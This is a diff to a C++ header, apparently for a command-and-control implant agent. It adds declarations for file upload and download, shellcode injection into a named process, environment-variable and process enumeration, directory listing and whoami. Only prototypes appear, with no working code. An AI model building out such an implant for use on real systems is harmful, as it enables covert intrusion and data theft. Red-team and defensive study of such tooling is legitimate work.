@@ -4,6 +4,7 @@
 #include <windows.h>
 #include <string>
 #include <vector>
+#include <map>
 #include "profile.h"
 
 
@@ -28,10 +29,49 @@ std::string SysInfo();
 */
 void UpdateProfile(rapidjson::Value* changes, MalleableProfile* currentProfile);
 
+/**
+ * Saves the decoded contents of `b64Contents` to `fileName`
+*/
 std::string Upload(std::string fileName, std::string b64Contents);
 
+/**
+ * Downloads the file at `filepath` and returns the base64 encoded contents
+*/
 std::string Download(std::string filepath);
 
+/**
+ * Injects the base64 encoded shellcode into the process with name `processName`
+*/
 std::string Inject(std::string b64shellcode, std::string processName);
+
+/**
+ * Change the current working directory to `path`
+*/
+bool ChangeDir(std::string path);
+
+/**
+ * Returns the current working directory
+*/
+std::string GetDir();
+
+/**
+ * Returns a map of all environment variables
+*/
+std::map<std::string, std::string> GetAllEnvVars();
+
+/**
+ * Gets all files in the current working directory
+*/
+std::vector<std::string> GetAllFilesInCurrentDirectory();
+
+/**
+ * Gets all running processes and their PIDs
+*/
+std::map<std::string, DWORD> GetProcessNameToPIDMap();
+
+/**
+ * Gets the username of the current user
+*/
+std::string Whoami();
 
 #endif
